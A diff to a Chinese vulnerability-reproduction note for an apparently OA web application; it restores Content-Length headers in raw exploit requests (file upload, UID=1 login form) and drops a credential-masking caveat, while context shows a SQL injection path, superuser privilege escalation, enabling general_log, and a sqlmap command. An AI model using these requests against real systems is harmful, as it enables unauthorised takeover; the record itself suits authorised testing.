@@ -42,7 +42,7 @@ schema_version: "1"
 
 ## 操作风险
 
-请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -117,6 +117,7 @@ User-Agent: python-requests/2.23.0
 Accept-Encoding: gzip, deflate
 Accept: */*
 Connection: keep-alive
+Content-Length: 855
 Content-Type: multipart/form-data; boundary=abc
 
 
@@ -130,7 +131,7 @@ Content-Disposition: form-data;
 --abc--
 ```
 
-> 请求长度说明：原资料 Content-Length 为 855；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 855；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HSPe4TuIOHnTpFa2n9x3rRKpWVQaCfv1vsu5TsVMQ7ItMmfQHpEHFvQ/640?wx_fmt=png)  
 
@@ -174,12 +175,13 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
 
 
 CODEUID={BED9DDBF-B3A5-ADAA-F671-9E349EAC7B5D}&UID=1
 ```
 
-> 请求长度说明：原资料 Content-Length 为 52；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 52；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 给用户赋予超级权限，  
 在注入点构造`general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges`刷新权限后重新登录，输入`set global general_log = on;`
@@ -328,6 +330,7 @@ User-Agent: python-requests/2.23.0
 Accept-Encoding: gzip, deflate
 Accept:*/*
 Connection: keep-alive
+Content-Length: 855
 Content-Type: multipart/form-data; boundary=abc
 
 
@@ -341,7 +344,7 @@ Content-Disposition: form-data;
 --abc--
 ```
 
-> 请求长度说明：原资料 Content-Length 为 855；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 855；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 SQLMAP:`python3 sqlmap.py -r “1.txt”  
 
